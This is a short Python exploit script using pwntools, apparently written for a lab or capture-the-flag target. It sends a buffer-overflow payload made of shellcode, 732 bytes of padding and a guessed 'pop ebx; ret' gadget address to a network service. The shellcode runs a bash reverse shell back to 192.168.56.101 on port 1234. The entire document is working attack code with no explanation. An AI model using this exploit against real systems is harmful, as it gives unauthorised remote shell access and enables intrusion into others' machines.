from pwn import args, asm, shellcraft, connect, p32
import random

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 3210)
hex_values = list(map(lambda x: hex(x)[2], range(0,16)))

def choice_pop_addr():
  # With GDB and the PEDA tool can review the address with dumprop
  if host == '127.0.0.1':
    # Address must have the form: 0x56xxx01e in my local machine
    part_addr = "".join(random.sample(hex_values,3))
    guess_addr = f"0x56{part_addr}01e"
  else:
    # Address must have the form: 0x40x01e in the target machine
    part_addr = "".join(random.sample(hex_values,1))
    guess_addr = f"0x40{part_addr}01e"
  return guess_addr

def main() -> None :
  if args.GUESS:
    pop_addr = choice_pop_addr()
  else:
    pop_addr = input("pop gadget address: ")
  argv = ["/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.56.101/1234 0>&1"]
  shell = asm(shellcraft.execve(path = argv[0], argv = argv))
  number_junk = 732 - len(shell)
  payload = shell
  payload += b'A' * number_junk
  payload += p32(int(pop_addr,16)) # gadget: pop ebx; ret
  io = connect(host, port)
  if not args.GUESS:
    _ = input("Send payload? [enter to continue]: ")
  io.sendline(payload)
  io.recv()
  io.close()

if __name__ == '__main__':
  main()
